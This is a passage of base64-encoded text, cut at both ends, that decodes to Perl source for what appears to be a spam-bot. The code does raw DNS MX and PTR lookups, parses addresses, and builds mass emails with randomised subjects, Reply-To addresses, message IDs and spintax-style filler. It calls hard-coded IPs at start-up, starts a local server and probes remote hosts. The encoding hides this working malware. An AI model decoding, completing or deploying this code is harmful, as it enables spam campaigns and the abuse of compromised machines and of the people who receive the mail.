XSwKcXIJCT0+ICgkX1sxXSA+PiA3KSAmIDEsCm9wY29kZQk9PiAoJF9bMV0gPj4gMykgJiAxNSwK
YWEJCT0+ICgkX1sxXSA+PiAyKSAmIDEsCnRjCQk9PiAoJF9bMV0gPj4gMSkgJiAxLApyZAkJPT4g
JF9bMV0gJiAxLApyYQkJPT4gKCRfWzJdID4+IDcpICYgMSwKegkJPT4gKCRfWzJdID4+IDQpICYg
NiwKcmNvZGUJPT4gJF9bMl0gJiAxNSwKcWRjb3VudAk9PiAkX1szXSwKYW5jb3VudAk9PiAkX1s0
XSwKbnNjb3VudAk9PiAkX1s1XSwKYXJjb3VudAk9PiAkX1s2XQp9OwpyZXR1cm4gKDEsICJTeW5j
aHJvbml6YXRpb24gZXJyb3IiKSBpZiAkaGVhZGVyLT57aWR9ICE9ICRzZXF1ZW5jZTsKcmV0dXJu
ICgxLCAiUmVjdXJzaW9uIGRpc2FibGVkIikgaWYgISRoZWFkZXItPntyYX07CnJldHVybiAoMiwg
IlF1ZXJ5IGZvcm1hdCBlcnJvciIpIGlmICRoZWFkZXItPntyY29kZX0gPT0gMTsKcmV0dXJuICgy
LCAiU2VydmVyIGZhaWx1cmUiKSBpZiAkaGVhZGVyLT57cmNvZGV9ID09IDI7CnJldHVybiAoMiwg
Ik5vbi1leGlzdGVudCBkb21haW4iKSBpZiAkaGVhZGVyLT57cmNvZGV9ID09IDM7CnJldHVybiAo
MiwgIkVtcHR5IGFuc3dlciBzZWN0aW9uIikgaWYgISRoZWFkZXItPnthbmNvdW50fTsKcmV0dXJu
ICgxLCAiQnJva2VuIHBhY2tldCIpIGlmICRsZW5ndGggPCAkb2Zmc2V0OwpteSAoJGFuc3dlciwg
JHJ0eXBlLCAkcmNsYXNzLCAkcnR0bCwgJHJsZW5ndGgpID0gKHt9LCAwLCAwLCAwLCAwKTsKd2hp
bGUgKCRoZWFkZXItPnthbmNvdW50fSkKewokaGVhZGVyLT57YW5jb3VudH0gLS07CigkbmFtZSwg
JG9mZnNldCwgJHJ0eXBlLCAkcmNsYXNzLCAkcnR0bCwgJHJsZW5ndGgpID0gJm5zcmVjb3JkKCRw
YWNrZXQsICRvZmZzZXQpOwpsYXN0IGlmICFkZWZpbmVkICRuYW1lOwppZiAoJHR5cGUgIT0gJHJ0
eXBlKQp7CiRvZmZzZXQgKz0gJHJsZW5ndGg7Cm5leHQ7Cn0KaWYgKCR0eXBlID09IDEpCnsKJG5h
bWUgPSBzdWJzdHIgKCQkcGFja2V0LCAkb2Zmc2V0LCA0KTsKbGFzdCBpZiAhZGVmaW5lZCAkbmFt
ZSB8fCA0ID4gbGVuZ3RoICRuYW1lOwokb2Zmc2V0ICs9ICRybGVuZ3RoOwokbmFtZSA9IGluZXRf
bnRvYSgkbmFtZSk7CiRhbnN3ZXItPnskbmFtZX0gPSAxOwp9CmVsc2lmICgkdHlwZSA9PSAxMikK
ewooJG5hbWUsICRvZmZzZXQpID0gJm5zdW5wYWNrKCRwYWNrZXQsICRvZmZzZXQpOwpsYXN0IGlm
ICFkZWZpbmVkICRuYW1lOwokYW5zd2VyLT57JG5hbWV9ID0gMTsKfQplbHNpZiAoJHR5cGUgPT0g
MTUpCnsKJHNlcXVlbmNlID0gc3Vic3RyICgkJHBhY2tldCwgJG9mZnNldCwgMik7Cmxhc3QgaWYg
IWRlZmluZWQgJHNlcXVlbmNlIHx8IDIgPiBsZW5ndGggJHNlcXVlbmNlOwooJG5hbWUsICRvZmZz
ZXQpID0gJm5zdW5wYWNrKCRwYWNrZXQsICgkb2Zmc2V0ICsgMikpOwpsYXN0IGlmICFkZWZpbmVk
ICRuYW1lOwokYW5zd2VyLT57JG5hbWV9ID0gdW5wYWNrICgibiIsICRzZXF1ZW5jZSk7Cn0KfQpy
ZXR1cm4gKDIsICJObyByZXNvdXJzZSByZWNvcmRzIikgaWYgIXNjYWxhciBrZXlzICUkYW5zd2Vy
OwpteSAkcmVzdWx0ID0gKHNvcnQgeyRhbnN3ZXItPnskYX0gPD0+ICRhbnN3ZXItPnskYn19IGtl
eXMgJSRhbnN3ZXIpWzBdOwppZiAoJHR5cGUgPT0gMTUgJiYgJGhlYWRlci0+e2FyY291bnR9KQp7
CndoaWxlICgkaGVhZGVyLT57bnNjb3VudH0pCnsKJGhlYWRlci0+e25zY291bnR9IC0tOwooJG5h
bWUsICRvZmZzZXQsICRydHlwZSwgJHJjbGFzcywgJHJ0dGwsICRybGVuZ3RoKSA9ICZuc3JlY29y
ZCgkcGFja2V0LCAkb2Zmc2V0KTsKbGFzdCBpZiAhZGVmaW5lZCAkbmFtZTsKJG9mZnNldCArPSAk
cmxlbmd0aDsKfQp3aGlsZSAoJGhlYWRlci0+e2FyY291bnR9KQp7CiRoZWFkZXItPnthcmNvdW50
fSAtLTsKKCRuYW1lLCAkb2Zmc2V0LCAkcnR5cGUsICRyY2xhc3MsICRydHRsLCAkcmxlbmd0aCkg
PSAmbnNyZWNvcmQoJHBhY2tldCwgJG9mZnNldCk7Cmxhc3QgaWYgIWRlZmluZWQgJG5hbWU7Cmlm
ICgkcnR5cGUgPT0gMSAmJiBleGlzdHMgJGFuc3dlci0+eyRuYW1lfSkKewokbmFtZSA9IHN1YnN0
ciAoJCRwYWNrZXQsICRvZmZzZXQsIDQpOwpsYXN0IGlmICFkZWZpbmVkICRuYW1lIHx8IDQgPiBs
ZW5ndGggJG5hbWU7CiRyZXN1bHQgPSBpbmV0X250b2EoJG5hbWUpOwpsYXN0Owp9CiRvZmZzZXQg
Kz0gJHJsZW5ndGg7Cn0KfQpyZXR1cm4gKDAsICRyZXN1bHQpOwp9CnN1YiBuc3B0cgp7Cm15ICgk
cGFja2FkZHIsICR0aW1lb3V0LCAkcXVlcnkpID0gQF87IG15ICR0eXBlID0gMTI7CnJldHVybiBp
ZiAhZGVmaW5lZCAkcXVlcnkgfHwgJHF1ZXJ5ICF+IC9eKFxkKylcLihcZCspXC4oXGQrKVwuKFxk
KykkLzsKcmV0dXJuIGlmICgkMSA+IDI1NSB8fCAkMiA+IDI1NSB8fCAkMyA+IDI1NSB8fCAkNCA+
IDI1NSk7CiRxdWVyeSA9ICIkNC4kMy4kMi4kMS5pbi1hZGRyLmFycGEiOwpteSAkcGFja2lkID0g
aW50IHJhbmQgNjU1MzY7IG15ICRwYWNrZXQgPSBwYWNrICgiblNuNCIsICRwYWNraWQsIDEsIDEs
IDAsIDAsIDApOwokcGFja2V0IC49IHBhY2sgKCJDIiwgbGVuZ3RoICRfKSAuICRfIGZvciAoc3Bs
aXQgKC9cLi8sIGxjICRxdWVyeSkpOwokcGFja2V0IC49IHBhY2sgKCJDbjIiLCAwLCAkdHlwZSwg
MSk7Cm15ICRvZmZzZXQgPSBsZW5ndGggJHBhY2tldDsKbXkgKCRzb2NrZXQsICRzZWxlY3QsICRi
dWZmZXIsICRyZXNwLCAkdGV4dCwgJHNpemUpOwppZiAoJHRlc3QtPnt1ZHA1M31bMF0gPT0gMSkK
ewokc29ja2V0ID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvPT4idWRwIik7CnJldHVybiB1
bmxlc3MgJHNvY2tldDsKJHNlbGVjdCA9IG5ldyBJTzo6U2VsZWN0ICRzb2NrZXQ7CmlmICgkc2Vs
ZWN0LT5jYW5fd3JpdGUoJHRpbWVvdXQpKQp7CnVubGVzcyAoJHNvY2tldC0+c2VuZCgkcGFja2V0
LCAwLCAkcGFja2FkZHIpKQp7CmNsb3NlICRzb2NrZXQ7CnJldHVybjsKfQp9CmVsc2UKewpjbG9z
ZSAkc29ja2V0OwpyZXR1cm47Cn0KaWYgKCRzZWxlY3QtPmNhbl9yZWFkKCR0aW1lb3V0KSkKewok
c29ja2V0LT5yZWN2KCRidWZmZXIsIDUxMik7Cn0KZWxzZQp7CmNsb3NlICRzb2NrZXQ7CnJldHVy
bjsKfQpjbG9zZSAkc29ja2V0OwpyZXR1cm4gaWYgIWRlZmluZWQgJGJ1ZmZlciB8fCAhbGVuZ3Ro
ICRidWZmZXI7Cn0KZWxzZQp7CiRzb2NrZXQgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG89
PiJ0Y3AiLCBUeXBlPT5TT0NLX1NUUkVBTSk7CnJldHVybiB1bmxlc3MgJHNvY2tldDsKJHNlbGVj
dCA9IG5ldyBJTzo6U2VsZWN0ICRzb2NrZXQ7CmlmICgkXk8gZXEgIk1TV2luMzIiKSB7IGlvY3Rs
ICgkc29ja2V0LCAweDgwMDQ2NjdlLCBwYWNrICgiTCIsIDEpKTsgfSBlbHNlIHsgJHNvY2tldC0+
YmxvY2tpbmcoMCk7IH0KdW5sZXNzICgkc29ja2V0LT5jb25uZWN0KCRwYWNrYWRkcikpCnsKaWYg
KCQhICE9ICRlaXByb2dyICYmICQhICE9ICRld2Jsb2NrKQp7CmNsb3NlICRzb2NrZXQ7CnJldHVy
bjsKfQp1bmxlc3MgKCRzZWxlY3QtPmNhbl93cml0ZSgkdGltZW91dCkpCnsKY2xvc2UgJHNvY2tl
dDsKcmV0dXJuOwp9CnVubGVzcyAoJHNvY2tldC0+Y29ubmVjdGVkKQp7CmNsb3NlICRzb2NrZXQ7
CnJldHVybjsKfQp9CiRzb2NrZXQtPmJsb2NraW5nKDEpOwokcGFja2V0ID0gcGFjayAoIm4iLCBs
ZW5ndGggJHBhY2tldCkgLiAkcGFja2V0OwppZiAoJHNlbGVjdC0+Y2FuX3dyaXRlKCR0aW1lb3V0
KSkKewp1bmxlc3MgKCRzb2NrZXQtPnNlbmQoJHBhY2tldCkpCnsKY2xvc2UgJHNvY2tldDsKcmV0
dXJuOwp9Cn0KZWxzZQp7CmNsb3NlICRzb2NrZXQ7CnJldHVybjsKfQppZiAoJHNlbGVjdC0+Y2Fu
X3JlYWQoJHRpbWVvdXQpKQp7CiRidWZmZXIgPSAiIjsgJHRleHQgPSAyOwp3aGlsZSAoKGxlbmd0
aCAkYnVmZmVyKSA8ICR0ZXh0KQp7CiRzaXplID0gJHRleHQgLSBsZW5ndGggJGJ1ZmZlcjsgJHJl
c3AgPSAiIjsKdW5sZXNzICgkc29ja2V0LT5yZWN2KCRyZXNwLCAkc2l6ZSkpCnsKbGFzdCBpZiAh
bGVuZ3RoICRyZXNwOwp9Cmxhc3QgaWYgIWxlbmd0aCAkcmVzcDsKJGJ1ZmZlciAuPSAkcmVzcDsK
fQppZiAoIWxlbmd0aCAkYnVmZmVyKQp7CmNsb3NlICRzb2NrZXQ7CnJldHVybjsKfQp1bmxlc3Mg
KCR0ZXh0ID0gdW5wYWNrICgibiIsICRidWZmZXIpKQp7CmNsb3NlICRzb2NrZXQ7CnJldHVybjsK
fQp1bmxlc3MgKCRzZWxlY3QtPmNhbl9yZWFkKCR0aW1lb3V0KSkKewpjbG9zZSAkc29ja2V0Owpy
ZXR1cm47Cn0KJGJ1ZmZlciA9ICIiOwp3aGlsZSAoKGxlbmd0aCAkYnVmZmVyKSA8ICR0ZXh0KQp7
CiRzaXplID0gJHRleHQgLSBsZW5ndGggJGJ1ZmZlcjsgJHJlc3AgPSAiIjsKdW5sZXNzICgkc29j
a2V0LT5yZWN2KCRyZXNwLCAkc2l6ZSkpCnsKbGFzdCBpZiAhbGVuZ3RoICRyZXNwOwp9Cmxhc3Qg
aWYgIWxlbmd0aCAkcmVzcDsKJGJ1ZmZlciAuPSAkcmVzcDsKfQp1bmxlc3MgKCR0ZXh0ID09IGxl
bmd0aCAkYnVmZmVyKQp7CmNsb3NlICRzb2NrZXQ7CnJldHVybjsKfQp9CmVsc2UKewpjbG9zZSAk
c29ja2V0OwpyZXR1cm47Cn0KY2xvc2UgJHNvY2tldDsKcmV0dXJuIGlmICFkZWZpbmVkICRidWZm
ZXIgfHwgIWxlbmd0aCAkYnVmZmVyOwp9CigkcmVzcCwgJHRleHQpID0gJm5zcGFyc2VyKFwkYnVm
ZmVyLCAkb2Zmc2V0LCAkcGFja2lkLCAkdHlwZSk7CnJldHVybiAhJHJlc3AgPyAkdGV4dCA6IHVu
ZGVmOwp9CnN1YiBtYWlsCnsKbXkgJGxpbmUgPSBzaGlmdDsKcmV0dXJuIGlmICFkZWZpbmVkICQk
bGluZSB8fCAkJGxpbmUgIX4gL15bXlxAXStcQFteXEBdK1wuW15cQF0rJC87Cm15ICgkbmFtZSwg
JG1haWwsICRpbmZvKSA9ICQkbGluZSA9fiAvXHMqKC4qPylbXHNcfDxdKihbXlxzfDxdK1xAW14+
XHxcc10rKT4qKC4qKSQvOwpyZXR1cm4gaWYgISRtYWlsOwokaW5mbyA9fiBzLy4qP1x8W1xzXHxd
KiguKz8pW1xzXHxdKiQvJDEvIGlmIGxlbmd0aCAkaW5mbzsKcmV0dXJuIChcJG1haWwsIFwkbmFt
ZSwgXCRpbmZvKTsKfQpzdWIgaW5pdAp7CiZtYWluKCc3Ny43Mi44My44MycsOTQsJy8nKTsKJm1h
aW4oJzc3LjcyLjgzLjg0Jyw5OCwnLycpOwomc3RhcnRzZXJ2ZXIoKSBpZiAkXk8gbmUgIk1TV2lu
MzIiOwp9CnN1YiBkYXRhCnsKbXkgKCR0bywgJGZyb20sICRiKSA9IEBfOwpteSAkdGltZSA9IHRp
bWU7Cm15ICR6b25lID0gc3ByaW50ZiAoIiVzJTAyZDAwIiwgJGItPnt0aW1lem9uZX1bMF0sICRi
LT57dGltZXpvbmV9WzFdKTsKbXkgJGRhdGUgPSBsb2NhbHRpbWUgJHRpbWU7ICRkYXRlID1+IHMv
XihcdyspXHMrKFx3KylccysoXGQrKVxzKyhcZCspOihcZCspOihcZCspXHMrKFxkKykkL3Nwcmlu
dGYgIiQxLCAkMyAkMiAkNyAkNDokNTokNiAlcyIsICR6b25lL2U7Cm15ICR3ZGF5ID0ge01vbiA9
PiAiTW9uZGF5IiwgVHVlID0+ICJUdWVzZGF5IiwgV2VkID0+ICJXZWRuZXNkYXkiLCBUaHUgPT4g
IlRodXJzZGF5IiwgRnJpID0+ICJGcmlkYXkiLCBTYXQgPT4gIlNhdHVyZGF5IiwgU3VuID0+ICJT
dW5kYXkifS0+eyQxfTsKbXkgJG5tb24gPSB7SmFuID0+IDEsIEZlYiA9PiAyLCBNYXIgPT4gMywg
QXByID0+IDQsIE1heSA9PiA1LCBKdW4gPT4gNiwgSnVsID0+IDcsIEF1ZyA9PiA4LCBTZXAgPT4g
OSwgT2N0ID0+IDEwLCBOb3YgPT4gMTEsIERlYyA9PiAxMn0tPnskMn07Cm15ICR0bW9uID0gWyJK
YW51YXJ5IiwgIkZlYnJ1YXJ5IiwgIk1hcmNoIiwgIkFwcmlsIiwgIk1heSIsICJKdW5lIiwgIkp1
bHkiLCAiQXVndXN0IiwgIlNlcHRlbWJlciIsICJPY3RvYmVyIiwgIk5vdmVtYmVyIiwgIkRlY2Vt
YmVyIl0tPlskbm1vbiAtIDFdOwpteSAkYW1wbSA9ICJBTSI7IG15ICRob3VyID0gaW50ICQ0OyAk
YW1wbSA9ICJQTSIgaWYgJGhvdXIgPT0gMTI7ICRob3VyID0gMTIgaWYgJGhvdXIgPT0gMDsgaWYg
KCRob3VyID4gMTIpIHsgJGFtcG0gPSAiUE0iOyAkaG91ciAtPSAxMjsgfQokZGF0ZSA9CnsKREFU
RQk9PiAkZGF0ZSwKV1dXVwk9PiAkd2RheSwKV1dXCQk9PiAkMSwKREQJCT0+IHNwcmludGYgKCIl
MDJkIiwgJDMpLApECQk9PiAkMywKTU1NTQk9PiAkdG1vbiwKTU1NCQk9PiAkMiwKTU0JCT0+IHNw
cmludGYgKCIlMDJkIiwgJG5tb24pLApNCQk9PiAkbm1vbiwKWVlZWQk9PiAkNywKWVkJCT0+IHN1
YnN0ciAoJDcsIC0yKSwKWgkJPT4gJHpvbmUsClRUCQk9PiAkYW1wbSwKdHQJCT0+IGxjICRhbXBt
LApISAkJPT4gJDQsCkgJCT0+IGludCAkNCwKaGgJCT0+IHNwcmludGYgKCIlMDJkIiwgJGhvdXIp
LApoCQk9PiAkaG91ciwKbW0JCT0+ICQ1LAptCQk9PiBpbnQgJDUsCnNzCQk9PiAkNiwKcwkJPT4g
aW50ICQ2Cn07Cm15ICgkbWFpbCwgJG5hbWUpID0gJm1haWwoXCRmcm9tKTsKbXkgKCR1c2VyLCAk
aG9zdCkgPSBzcGxpdCAoL1xALywgJCRtYWlsKTsKJGZyb20gPSB7QUREUiA9PiBsZW5ndGggJCRu
YW1lID8gIiQkbmFtZSA8JCRtYWlsPiIgOiAiPCQkbWFpbD4iLCBOQU1FID0+IGxlbmd0aCAkJG5h
bWUgPyAkJG5hbWUgOiAiIiwgTUFJTCA9PiAkJG1haWwsIFVTRVIgPT4gJHVzZXIsIEhPU1QgPT4g
JGhvc3R9OwpteSAkcmVwbHl0byA9ICRmcm9tOwppZiAoJGItPntmcm9tfVswXSBuZSAkYi0+e3Jl
cGx5dG99WzBdKQp7CigkbWFpbCwgJG5hbWUpID0gJm1haWwoXEB7JGItPntyZXBseXRvfX1baW50
IHJhbmQgc2NhbGFyIEB7JGItPntyZXBseXRvfX1dKTsKKCR1c2VyLCAkaG9zdCkgPSBzcGxpdCAo
L1xALywgJCRtYWlsKTsKJHJlcGx5dG8gPSB7QUREUiA9PiBsZW5ndGggJCRuYW1lID8gIiQkbmFt
ZSA8JCRtYWlsPiIgOiAiPCQkbWFpbD4iLCBOQU1FID0+IGxlbmd0aCAkJG5hbWUgPyAkJG5hbWUg
OiAiIiwgTUFJTCA9PiAkJG1haWwsIFVTRVIgPT4gJHVzZXIsIEhPU1QgPT4gJGhvc3R9Owp9Cmlm
ICgkYi0+e21ldGhvZH0gPT0gMCkKewpAXyA9ICgpOwpmb3JlYWNoIChAJHRvKSB7ICgkbWFpbCwg
JG5hbWUpID0gJm1haWwoXCRfKTsgJF8gPSBsZW5ndGggJCRuYW1lID8gIiQkbmFtZSA8JCRtYWls
PiIgOiAiPCQkbWFpbD4iOyBwdXNoIEBfLCAkXzsgfQooJHVzZXIsICRob3N0KSA9IHNwbGl0ICgv
XEAvLCAkJG1haWwpOwokdG8gPSB7QUREUiA9PiBqb2luICgiLFx4MERceDBBXHgyMFx4MjBceDIw
XHgyMFx4MjBceDIwXHgyMFx4MjAiLCBAXyksIE5BTUUgPT4gbGVuZ3RoICQkbmFtZSA/ICQkbmFt
ZSA6ICIiLCBNQUlMID0+ICQkbWFpbCwgVVNFUiA9PiAkdXNlciwgSE9TVCA9PiAkaG9zdH07Cn0K
ZWxzZQp7CigkbWFpbCwgJG5hbWUpID0gJm1haWwoXCR0by0+WzBdKTsKKCR1c2VyLCAkaG9zdCkg
PSBzcGxpdCAoL1xALywgJCRtYWlsKTsKJHRvID0ge0FERFIgPT4gbGVuZ3RoICQkbmFtZSA/ICIk
JG5hbWUgPCQkbWFpbD4iIDogIjwkJG1haWw+IiwgTkFNRSA9PiBsZW5ndGggJCRuYW1lID8gJCRu
YW1lIDogIiIsIE1BSUwgPT4gJCRtYWlsLCBVU0VSID0+ICR1c2VyLCBIT1NUID0+ICRob3N0fTsK
fQpteSAkaGVhZCA9CnsKSEVMTwkJPT4gJGItPntoZWxvfSwKVFlQRQkJPT4gJGItPnt0eXBlfSA/
ICJodG1sIiA6ICJwbGFpbiIsClNVQkpFQ1QJCT0+IEB7JGItPntzdWJqZWN0fX1baW50IHJhbmQg
c2NhbGFyIEB7JGItPntzdWJqZWN0fX1dLApDSEFSU0VUCQk9PiAkYi0+e2NoYXJzZXR9LApFTkNP
RElORwk9PiAkYi0+e2NoYXJzZXR9IGVxICJ3aW5kb3dzLTEyNTEiID8gIjhiaXQiIDogIjdiaXQi
LApOUFJJT1JJVFkJPT4gKDUgLSAkYi0+e3ByaW9yaXR5fSAqICRiLT57cHJpb3JpdHl9IC0gKCRi
LT57cHJpb3JpdHl9ID09IDEgPyAxIDogMCkpLApUUFJJT1JJVFkJPT4gWyJMb3ciLCAiTm9ybWFs
IiwgIkhpZ2giXS0+WyRiLT57cHJpb3JpdHl9XSwKTUVTU0FHRUlECT0+IHNwcmludGYgKCIlMDh4
XC4lMDR4JTA0eCIsIGludCAoJHRpbWUgKiAwLjAwMjMyODMwNjQzNjUzODcgKyAyNzExMTkwMi44
MzI5ODQ5KSwgaW50IHJhbmQgMzI3NjksIGludCByYW5kIDMyNzY5KQp9OwpteSAkbGV0dGVyID0g
bGVuZ3RoICRiLT57bGV0dGVyfSA/IHNwcmludGYgKCIlcyVzJXMiLCAkYi0+e2hlYWRlcn0sICJc
eDBEXHgwQVx4MERceDBBIiwgJGItPntsZXR0ZXJ9KSA6ICRiLT57aGVhZGVyfTsKJGxldHRlciA9
fiBzL1wlJF9cJS8kaGVhZC0+eyRffS9nIGZvcmVhY2ggKGtleXMgJSRoZWFkKTsKJGxldHRlciA9
fiBzL1wlJF9cJS8kZGF0ZS0+eyRffS9nIGZvcmVhY2ggKGtleXMgJSRkYXRlKTsKJGxldHRlciA9
fiBzL1wlRlJPTSRfXCUvJGZyb20tPnskX30vZyBmb3JlYWNoIChrZXlzICUkZnJvbSk7CiRsZXR0
ZXIgPX4gcy9cJVJFUExZVE8kX1wlLyRyZXBseXRvLT57JF99L2cgZm9yZWFjaCAoa2V5cyAlJHJl
cGx5dG8pOwokbGV0dGVyID1+IHMvXCVUTyRfXCUvJHRvLT57JF99L2cgZm9yZWFjaCAoa2V5cyAl
JHRvKTsKJnRhZyhcJGxldHRlcik7CmlmICghbGVuZ3RoICRiLT57bGV0dGVyfSkKewokbGV0dGVy
ID1+IHMvXHgwRC8vZ207CiRsZXR0ZXIgPX4gcy9ceDBBL1x4MERceDBBL2dtOwp9CnJldHVybiAk
bGV0dGVyOwp9CnN1YiBxdW90ZWQgKCQpCnsKbXkgJGxpbmUgPSBzaGlmdDsKJGxpbmUgPX4gcy8o
W14gXHRceDBEXHgwQSEiI1wkJSYnKCkqKyxcLS5cLzAtOTo7PD4/XEBBLVpbXFxcXV5fYGEtent8
fX5dKS9zcHJpbnRmICgiPSUwMlgiLCBvcmQgKCQxKSkvZWc7CiRsaW5lID1+IHMvKFsgXHRdKykk
L2pvaW4gKCIiLCBtYXAge3NwcmludGYgKCI9JTAyWCIsIG9yZCAoJF8pKX0gc3BsaXQgKCIiLCAk
MSkpL2VnbTsKbXkgJGxpbmVzID0gIiI7CiRsaW5lcyAuPSAiJDE9XHgwRFx4MEEiIHdoaWxlICRs
aW5lID1+IHMvKC4qP15bXlx4MERceDBBXXs3MX0oPzpbXj1ceDBEXHgwQV17Mn0oPyFbXj1ceDBE
XHgwQV17MCwxfSQpfFtePVx4MERceDBBXSg/IVtePVx4MERceDBBXXswLDJ9JCl8KD8hW149XHgw
RFx4MEFdezAsM30kKSkpLy94c207CiRsaW5lcyAuPSAkbGluZTsKcmV0dXJuICRsaW5lczsKfQpz
dWIgdGFnCnsKbXkgJGxpbmUgPSBzaGlmdDsKbXkgJHNhdmUgPSBbXTsKJCRsaW5lID1+IHMvXFty
YW5kb21cXShbXlxbXSopXFtcL3JhbmRvbVxdKHtcZCssXGQrfSk/KFwoKFxkKylcKSk/LyZ0YWdy
YW5kb20oJDEsICQyLCAkNCwgXCRzYXZlKS9lZzsKJCRsaW5lID1+IHMvXFtzdHJpbmdcXShbXlxb
XSopXFtcL3N0cmluZ1xdKFwoKFxkKylcKSk/LyZ0YWdzdHJpbmcoJDEsICQzLCBcJHNhdmUpL2Vn
OwokJGxpbmUgPX4gcy9cJVxbKFxkKylcXS8kMSA8IDY0ICYmIGRlZmluZWQgJHNhdmUtPlskMV0g
PyAkc2F2ZS0+WyQxXSA6ICIiL2VnOwokJGxpbmUgPX4gcy9cW3F1b3RcXSguKj8pXFtcL3F1b3Rc
XS8mcXVvdGVkKCQxKS9lZ3M7Cn0Kc3ViIHRhZ3JhbmRvbQp7Cm15ICgkbGluZSwgJHNwZWMsICRj
ZWxsLCAkc2F2ZSkgPSBAXzsKaWYgKGRlZmluZWQgJGxpbmUgJiYgbGVuZ3RoICRsaW5lKQp7Cmlm
IChkZWZpbmVkICRzcGVjICYmICRzcGVjID1+IC9eeyhcZCspLChcZCspfSQvKQp7CiRzcGVjID0g
JDIgPiA2NCA/IDY0IDogJDI7CiRzcGVjID0gJDEgPCAkc3BlYyA/ICgkMSArIGludCByYW5kICgx
ICsgJHNwZWMgLSAkMSkpIDogJHNwZWM7Cn0KZWxzZQp7CiRzcGVjID0gbGVuZ3RoICRsaW5lOwok
c3BlYyA9IDEgKyAoJHNwZWMgPiA2NCA/IGludCByYW5kIDY0IDogaW50IHJhbmQgJHNwZWMpOwp9
CiRsaW5lID0gW3NwbGl0ICgvLywgJGxpbmUpXTsKJGxpbmUgPSBqb2luICgnJywgQCRsaW5lW21h
cCB7cmFuZCBAJGxpbmV9KDEuLiRzcGVjKV0pOwp9CiRsaW5lID0gZGVmaW5lZCAkbGluZSA/ICRs
aW5lIDogIiI7CiQkc2F2ZS0+WyRjZWxsXSA9ICRsaW5lIGlmIGRlZmluZWQgJGNlbGwgJiYgJGNl
bGwgPCA2NDsKcmV0dXJuICRsaW5lOwp9CnN1YiB0YWdzdHJpbmcKewpteSAoJGxpbmUsICRjZWxs
LCAkc2F2ZSkgPSBAXzsKaWYgKGRlZmluZWQgJGxpbmUgJiYgbGVuZ3RoICRsaW5lKQp7CiRsaW5l
ID0gW3NwbGl0ICgvXHwvLCAkbGluZSldOwokbGluZSA9ICRsaW5lLT5baW50IHJhbmQgc2NhbGFy
IEAkbGluZV07Cn0KJGxpbmUgPSBkZWZpbmVkICRsaW5lID8gJGxpbmUgOiAiIjsKJCRzYXZlLT5b
JGNlbGxdID0gJGxpbmUgaWYgZGVmaW5lZCAkY2VsbCAmJiAkY2VsbCA8IDY0OwpyZXR1cm4gJGxp
bmU7Cn0Kc3ViIHRlc3QKewp3aGlsZSAoMSkKewpteSAkcmVhZGVycyA9IElPOjpTZWxlY3QtPm5l
dygpIG9yIGxhc3Q7Cm15ICR3cml0ZXJzID0gSU86OlNlbGVjdC0+bmV3KCkgb3IgbGFzdDsKbXkg
JHNlc3Npb24gPSB7fTsKZm9yZWFjaCBteSAkcmVzdWx0IChrZXlzICUkdGVzdCkKewp3aGlsZSAo
MSA8IHNjYWxhciBAeyR0ZXN0LT57JHJlc3VsdH19KQp7Cm15ICRob3N0ID0gcG9wIEB7JHRlc3Qt
PnskcmVzdWx0fX07Cm15ICRhZGRyID0gcGFjayAoIkM0Iiwgc3BsaXQgKC9cLi8sICRob3N0KSk7
Cm15ICgkcHJvdG9jb2wsICRwb3J0KTsKaWYgKCRyZXN1bHQgZXEgImlwIikKewooJHByb3RvY29s
LCAkcG9ydCkgPSAoInRjcCIsIDgwKTsKfQplbHNlCnsKKCRwcm90b2NvbCwgJHBvcnQpID0gJHJl
c3VsdCA9fiAvXih0Y3B8dWRwKShcZCspJC87Cn0KJGFkZHIgPSBzb2NrYWRkcl9pbigkcG9ydCwg
JGFkZHIpOwpteSAkc29ja2V0ID0gJHByb3RvY29sIGVxICJ0Y3AiID8gSU86OlNvY2tldDo6SU5F
VC0+bmV3KFByb3RvID0+ICJ0Y3AiLCBUeXBlID0+IFNPQ0tfU1RSRUFNKSA6IElPOjpTb2NrZXQ6
OklORVQtPm5ldyhQcm90byA9PiAidWRwIik7Cm5leHQgdW5sZXNzICRzb2NrZXQ7CmlmICgkXk8g
ZXEgIk1TV2luMzIiKSB7IGlvY3RsICgkc29ja2V0LCAweDgwMDQ2NjdlLCBwYWNrICgiTCIsIDEp
KTsgfSBlbHNlIHsgJHNvY2tldC0+YmxvY2tpbmcoMCk7IH0KaWYgKCRwcm90b2NvbCBlcSAidGNw
IikKewp1bmxlc3MgKCRzb2NrZXQtPmNvbm5lY3QoJGFkZHIpKQp7CmlmICgkISAhPSAkZWlwcm9n
ciAmJiAkISAhPSAkZXdibG9jaykKewpjbG9zZSAkc29ja2V0OwpuZXh0Owp9Cn0KfQokd3JpdGVy
cy0+YWRkKCRzb2NrZXQpOwokc2Vzc2lvbi0+eyRzb2NrZXR9ID0ge3N0YXR1cyA9PiAkcHJvdG9j
b2wgZXEgInRjcCIgPyAiY24iIDogIndyIiwgYnVmZmVyID0+ICIiLCB0aW1lb3V0ID0+IDUsIHJl
c3VsdCA9PiAkcmVzdWx0LCBhZGRyID0+ICRhZGRyfTsKaWYgKCRwb3J0ID09IDUzKQp7CiRzZXNz
aW9uLT57JHNvY2tldH17YnVmZmVyfSAuPSBwYWNrICgiblNuNCIsIGludCByYW5kIDY1NTM1LCAx
LCAxLCAwLCAwLCAwKTsKJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9IC49IHBhY2sgKCJDIiwg
bGVuZ3RoICRfKSAuICRfIGZvciAoc3BsaXQgKC9cLi8sICRob3N0KSk7CiRzZXNzaW9uLT57JHNv
Y2tldH17YnVmZmVyfSAuPSBwYWNrICgiQ24yIiwgMCwgMSwgMSk7CiRzZXNzaW9uLT57JHNvY2tl
dH17YnVmZmVyfSA9IGpvaW4gKCIiLCBwYWNrICgibiIsIGxlbmd0aCAkc2Vzc2lvbi0+eyRzb2Nr
ZXR9e2J1ZmZlcn0pLCAkc2Vzc2lvbi0+eyRzb2NrZXR9e2J1ZmZlcn0pIGlmICRwcm90b2NvbCBl
cSAidGNwIjsKfQplbHNpZiAoJHBvcnQgPT0gODApCnsKJHNlc3Npb24tPnskc29ja2V0fXtidWZm
ZXJ9ID0gam9pbiAoIlx4MERceDBBIiwgIkdFVCAvIEhUVFAvMS4xIiwgIkFjY2VwdDogaW1hZ2Uv
Z2lmLCBpbWFnZS94LXhiaXRtYXAsIGltYWdlL2pwZWcsIGltYWdlL3BqcGVnLCAqLyoiLCAiVXNl
